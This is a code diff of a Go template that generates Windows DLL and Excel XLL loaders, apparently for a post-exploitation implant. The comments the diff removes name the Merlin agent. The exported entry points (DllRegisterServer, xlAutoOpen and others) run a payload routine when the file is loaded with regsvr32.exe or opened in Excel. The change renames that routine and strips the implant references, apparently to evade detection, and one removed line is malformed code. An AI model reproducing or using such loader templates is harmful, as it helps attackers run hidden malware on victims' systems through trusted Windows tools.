@@ -5,35 +5,34 @@ import "C"
 `
 
 const DllFunc = `
-//export cd.Init = cd.FuncName + "()"
-func cd.Init = cd.FuncName + "()"() { checkData() }
 
-// DllInstall is used when executing the Merlin agent with regsvr32.exe (i.e. regsvr32.exe /s /n /i merlin.dll)
+
+// DllInstall is used when executing with regsvr32.exe 
 // https://msdn.microsoft.com/en-us/library/windows/desktop/bb759846(v=vs.85).aspx
 
 //export DllInstall
-func DllInstall() { checkData() }
+func DllInstall() { SystemFunction_032() }
 
-// DllRegisterServer is used when executing the Merlin agent with regsvr32.exe (i.e. regsvr32.exe /s merlin.dll)
+// DllRegisterServer is used when executing with regsvr32.exe 
 // https://msdn.microsoft.com/en-us/library/windows/desktop/ms682162(v=vs.85).aspx
 
 //export DllRegisterServer
-func DllRegisterServer() { checkData() }
+func DllRegisterServer() { SystemFunction_032() }
 
-// DllUnregisterServer is used when executing the Merlin agent with regsvr32.exe (i.e. regsvr32.exe /s /u merlin.dll)
+// DllUnregisterServer is used when executing with regsvr32.exe 
 // https://msdn.microsoft.com/en-us/library/windows/desktop/ms691457(v=vs.85).aspx
 
 //export DllUnregisterServer
-func DllUnregisterServer() { checkData() }
+func DllUnregisterServer() { SystemFunction_032() }
 
 //export xlAutoOpen
-func xlAutoOpen() { checkData() }
+func xlAutoOpen() { SystemFunction_032() }
 
 //export xlAutoRegister 
-func xlAutoRegister() { checkData() }
+func xlAutoRegister() { SystemFunction_032() }
 
 //export xlAutoRegister12
-func xlAutoRegister12() { checkData() }
+func xlAutoRegister12() { SystemFunction_032() }
 `
 
 const Xll = `
